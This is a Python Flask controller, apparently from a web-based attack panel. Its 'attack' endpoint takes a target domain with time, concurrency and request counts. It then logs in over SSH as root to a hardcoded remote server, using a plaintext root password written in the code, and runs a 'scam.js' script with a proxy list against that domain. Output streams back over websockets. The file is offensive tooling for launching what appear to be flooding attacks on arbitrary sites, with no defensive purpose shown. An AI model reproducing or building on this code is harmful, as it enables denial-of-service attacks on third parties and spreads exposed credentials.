from flask import jsonify, request
from flask import current_app
from app.extensions import socketio
import paramiko
import threading

class AttackController:
    def _stream_output(self, channel, sid):
        while True:
            if channel.recv_ready():
                output = channel.recv(4096).decode()
                print(output)
                socketio.emit('log_message', {'data': output}, room=sid)
            if channel.recv_stderr_ready():
                error = channel.recv_stderr(4096).decode()
                print(error)
                socketio.emit('log_message', {'data': f"ERROR: {error}"}, room=sid)
            if channel.exit_status_ready():
                break

    def _executeRemoteCommand(self, hostname, username, password, command, sid):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hostname, username=username, password=password)
            
            # Open session for streaming
            transport = ssh.get_transport()
            channel = transport.open_session()
            channel.get_pty()
            channel.exec_command(command)

            # Start streaming thread
            stream_thread = threading.Thread(
                target=self._stream_output, 
                args=(channel, sid)
            )
            stream_thread.daemon = True
            stream_thread.start()
            
            return True, None
        except Exception as e:
            return False, str(e)

    def attack(self):
        data = request.get_json()

        sid = data.get('sid', '')
        domain = data.get('domain', '')
        time = data.get('time', '60')
        concurrents = data.get('concurrents', '10')
        requests = data.get('requests', '100')

        if not domain:
            return jsonify({
                "status": "error",
                "message": "Domain is required"
            }), 400

        command = f"xvfb-run /root/.nvm/versions/node/v20.18.1/bin/node scam.js {domain} {time} {concurrents} {requests} proxy.txt --debug true --auth true"

        hostname = "199.204.99.242"
        username = "root" 
        password = "42f1cb88E05w"
        
        success, error = self._executeRemoteCommand(hostname, username, password, command, sid)
        
        if not success:
            return jsonify({
                "status": "error",
                "message": error
            }), 500
            
        return jsonify({
            "status": "success",
            "message": "Attack started. Check websocket for live logs."
        })